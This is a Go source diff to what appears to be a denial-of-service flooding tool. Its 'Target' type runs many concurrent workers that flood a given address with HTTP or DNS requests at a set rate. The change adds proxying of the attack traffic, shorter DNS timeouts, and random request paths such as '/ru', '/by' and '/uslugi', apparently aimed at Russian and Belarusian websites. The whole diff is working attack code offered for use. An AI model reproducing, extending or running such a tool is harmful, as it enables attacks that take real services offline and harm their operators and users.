@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"math/rand"
 	"net/http"
+	"net/url"
 	"strings"
 	"sync/atomic"
 	"time"
@@ -29,12 +30,13 @@ type Target struct {
 
 	urls []string
 
-	httpClient *http.Client
-	dnsClient  *dns.Client
+	httpTransport *http.Transport
+	httpClient    *http.Client
+	dnsClient     *dns.Client
 }
 
 // Creates a target instance with all the configurations needed for an attack.
-func New(addr string) Target {
+func New(addr, proxy string) Target {
 	tr := &http.Transport{
 		MaxIdleConns:       10000,
 		IdleConnTimeout:    30 * time.Second,
@@ -44,25 +46,43 @@ func New(addr string) Target {
 	client := &http.Client{Transport: tr}
 
 	dnsClient := &dns.Client{
-		DialTimeout: time.Second * 30,
-		ReadTimeout: time.Second * 30,
+		DialTimeout: time.Millisecond * 700,
+		ReadTimeout: time.Second,
 	}
 
-	return Target{
-		address:    strings.Trim(addr, " \r\n\t"),
-		port:       80,
-		randomize:  true,
-		httpClient: client,
-		dnsClient:  dnsClient,
+	ret := Target{
+		address:       strings.Trim(addr, " \r\n\t"),
+		port:          80,
+		randomize:     true,
+		httpTransport: tr,
+		httpClient:    client,
+		dnsClient:     dnsClient,
 	}
+
+	ret.SetProxy(proxy)
+
+	return ret
 }
 
-// Returns a name used in CLI multi-progressbar UI or GUI.
+// Name Returns a name used in CLI multi-progressbar UI or GUI.
 func (t *Target) Name() string {
 	return t.address
 }
 
-// Executes an attack. Usually has to be called as a goroutine.
+// SetProxy sets proxy for http requests.
+func (t *Target) SetProxy(proxy string) error {
+	if proxy == "" {
+		return nil
+	}
+	proxyURL, err := url.Parse(proxy)
+	if err != nil {
+		return err
+	}
+	t.httpTransport.Proxy = http.ProxyURL(proxyURL)
+	return nil
+}
+
+// Run Executes an attack. Usually has to be called as a goroutine.
 // N is the number of concurrent workers and maxRPS is the target requests per second.
 func (t *Target) Run(ctx context.Context, N, maxRPS int, progress func(requests, errors int64)) {
 	t.requestCh = make(chan string, N)
@@ -95,7 +115,7 @@ func (t *Target) Run(ctx context.Context, N, maxRPS int, progress func(requests,
 func (t *Target) flood(ctx context.Context) {
 	for addr := range t.requestCh {
 		atomic.AddInt64(&t.requests, 1)
-		if t.performHttp(ctx, addr) != nil {
+		if t.perform(ctx, addr) != nil {
 			atomic.AddInt64(&t.errors, 1)
 		}
 	}
@@ -105,25 +125,32 @@ func (t *Target) perform(ctx context.Context, addr string) error {
 	switch {
 	case strings.HasPrefix(addr, "dns://"):
 		return t.performDNS(ctx, addr)
-	case strings.HasPrefix(addr, "smtp://"):
-		fallthrough
-	case strings.HasPrefix(addr, "pop3://"):
-		fallthrough
+	// case strings.HasPrefix(addr, "smtp://"):
+	// 	fallthrough
+	// case strings.HasPrefix(addr, "pop3://"):
+	// 	fallthrough
 	default:
 		return t.performHttp(ctx, addr)
 	}
 }
 
 func (t *Target) generate() string {
-	if strings.HasPrefix(t.address, "https://") || strings.HasPrefix(t.address, "http://") {
+	if strings.HasPrefix(t.address, "dns://") {
 		return t.address
 	}
 
-	protoArr := []string{"https", "http"}
-	port := t.port
-	proto := protoArr[rand.Intn(len(protoArr))]
+	port := ""
 
-	url := ""
+	proto := "https://"
+	if strings.HasPrefix(t.address, "https://") || strings.HasPrefix(t.address, "http://") {
+		proto = ""
+	}
 
-	return fmt.Sprintf("%s://%s:%d/%s", proto, t.address, port, url)
+	urls := []string{"/info", "/admin", "/ru", "/by", "/en", "/user", "/api", "/auth", "/prod", "/uslugi", "/blog", "/about"}
+	url := urls[rand.Intn(len(urls))]
+	if strings.Contains(t.address, "/") {
+		url = ""
+	}
+
+	return fmt.Sprintf("%s%s%s%s", proto, t.address, port, url)
 }
